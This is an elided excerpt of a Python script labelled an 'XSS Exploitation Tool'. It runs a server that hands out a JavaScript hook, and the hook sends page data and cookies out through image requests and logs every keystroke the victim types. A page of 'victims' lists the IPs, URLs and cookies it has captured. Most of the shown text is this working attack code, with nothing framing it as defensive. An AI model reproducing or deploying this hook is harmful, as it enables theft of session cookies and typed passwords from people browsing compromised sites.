...
class XSSHookHandler(BaseHTTPRequestHandler):
    ...
    def do_GET(self):
        if self.path == '/hook.js':
            ...
            (function(){
                ...
                var img = new Image();
                img.src = 'http://%s:%s/log?data=' + encodeURIComponent(JSON.stringify(data));
                
                // تسجيل keystrokes
                document.onkeypress = function(e) {
                    var keyImg = new Image();
                    keyImg.src = 'http://%s:%s/keys?key=' + e.key;
                };
            })();
            """ % (self.server.server_ip, self.server.server_port, 
                   self.server.server_ip, self.server.server_port)
    ...
    def generate_victims_html(self):
        ...
        html = "<table border='1' style='width:100%%'><tr><th>Time</th><th>IP</th><th>URL</th><th>Cookies</th></tr>"
...
class XSSHookServer(HTTPServer):
    def __init__(self, server_ip, port=8001):
        self.server_ip = server_ip
        self.server_port = port
        super().__init__(('0.0.0.0', port), XSSHookHandler)

def start_server(port=8001):
    server = XSSHookServer('localhost', port)
    print(f"[+] XSS Hook Server started on http://localhost:{port}")
    print(f"[+] Hook URL: http://localhost:{port}/hook.js")
...
if __name__ == "__main__":
    ...
    print(f"[*] Starting XSS Exploitation Tool on port {port}...")
    start_server(port)